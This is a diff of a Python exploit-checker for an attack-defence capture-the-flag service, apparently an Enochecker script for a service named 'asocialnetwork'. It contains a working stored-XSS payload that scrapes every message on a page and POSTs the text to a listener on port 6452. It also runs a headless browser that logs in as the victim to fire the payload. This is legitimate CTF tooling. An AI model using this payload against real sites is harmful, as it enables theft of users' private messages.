@@ -1,6 +1,7 @@
 import json
 import random
 import secrets
+from signal import SIGTERM
 from typing import Optional
 from httpx import AsyncClient
 from logging import LoggerAdapter
@@ -20,9 +21,10 @@ import time
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from http.server import BaseHTTPRequestHandler, HTTPServer
-import threading
+import multiprocessing
 import hashlib
-
+import os
+from queue import Queue
 HOST = "0.0.0.0"
 PORT = 6452
 
@@ -30,7 +32,10 @@ SERVICE_PORT = 3000
 checker = Enochecker("asocialnetwork", SERVICE_PORT)
 app = lambda: checker.app
 getUrl = lambda task: f"http://{task.address + ':' + str(SERVICE_PORT)}"
-
+chrome_options = webdriver.ChromeOptions()
+chrome_options.add_argument("--headless")
+chrome_options.add_argument('--no-sandbox')
+driver = webdriver.Chrome('/usr/bin/chromedriver', options=chrome_options)
 def encode(message, recipient, logger):
     logger.debug(f"Encoding {message} for {recipient}")
     message = message.encode('utf-8').hex()
@@ -294,10 +299,9 @@ exploitMessage = "<script>function getText(){{let text='';let messages = documen
                  "'message');for(let i = 0; i < messages.length; i++){{text += messages[i].innerHTML;}}return text;" \
                  " }}fetch('http://{0}:6452/', {{method: 'POST', body:'username=' + getText(),headers: {{ " \
                  "'Content-Type': 'application/x-www-form-urlencoded', }},}}); </script>"
-result = [None]
-webServer = [None]
+
 def server(logger):
-    class MyServer(BaseHTTPRequestHandler):
+    class ExploitServer(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
             self.send_header("Content-type", "text/html")
@@ -307,29 +311,31 @@ def server(logger):
         def do_POST(self):
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length)
-            logger.debug(post_data)
-            result[0] = post_data.decode()
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
-    webServer[0] = HTTPServer((HOST, PORT), MyServer)
-    logger.debug("Server started http://%s:%s" % (HOST, PORT))
-    try:
-        webServer[0].serve_forever()
-    except KeyboardInterrupt:
-        pass
+            if not os.path.isfile("/checker/flag.txt"):
+                os.mknod("/checker/flag.txt")
+            with open("/checker/flag.txt", "wb") as exploit:
+                exploit.write(post_data)
 
-    webServer[0].server_close()
+    webServer = HTTPServer((HOST, PORT), ExploitServer)
+    try:
+        webServer.serve_forever()
+    except SIGTERM:
+        logger.debug("Server killed")
+        pass
+    webServer.server_close()
     print("Server stopped.")
 
-
+def getFlag(logger):
+    while True:
+        if os.path.isfile("/checker/flag.txt") and os.access("/checker/flag.txt", os.R_OK):
+            with open("/checker/flag.txt", "r") as flag:
+                return flag.read()
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
+    process = multiprocessing.Process(target=server, args=(logger,))
+    process.start()
     start = time.time()
     startCreateServer = time.time()
-    server_thread = threading.Thread(target=server, args=(logger, ))
-    server_thread.start()
     logger.debug(f"Create server time: {time.time() - startCreateServer}")
     startRegister = time.time()
     username = secrets.token_hex(32)
@@ -346,20 +352,16 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, clie
     xss_test(task, logger)
     logger.debug(f"Exploit time: {time.time() - startExploit}")
     startResult = time.time()
-    while not result[0]:
-        pass
     logger.debug(f"Result time: {time.time() - startResult}")
-    startServerShutdown = time.time()
-    webServer[0].shutdown()
-    server_thread.join()
-    logger.debug(f"Server shutdown time: {time.time() - startServerShutdown}")
-    logger.debug('Server stopped')
-    logger.debug(f"Total time: {time.time() - start}")
-    startFlag = time.time()
-    flag = searcher.search_flag(result[0])
-    logger.debug(f"Flag time: {time.time() - startFlag}")
-    if flag:
-        return flag
+    flagText = getFlag(logger)
+    flag = searcher.search_flag(flagText)
+    # if os.path.isfile("/checker/flag.txt"):
+    #     os.remove("/checker/flag.txt")
+    process.terminate()
+    # process.join()
+    logger.debug(f"Returning {time.time() - start}")
+    return flag
+
 
 
 def xss(task, start, logger):
@@ -378,16 +380,12 @@ def xss(task, start, logger):
 
 
 def xss_test(task, logger):
-    chrome_options = webdriver.ChromeOptions()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument('--no-sandbox')
-    driver = webdriver.Chrome('/usr/lib/chromium-browser/chromedriver', options=chrome_options)
+    driver.get(f"{getUrl(task)}/logout")
     driver.get(f"{getUrl(task)}/login")
     driver.execute_script(f"document.getElementById('username').value = '{json.loads(task.attack_info)['username']}';")
     driver.execute_script(f"document.getElementById('password').value = 'password';")
     driver.execute_script("document.getElementsByTagName('form')[0].submit();")
     driver.get(f"{getUrl(task)}/messages/admin")
-    driver.close()
 
 @checker.exploit(1)
 async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
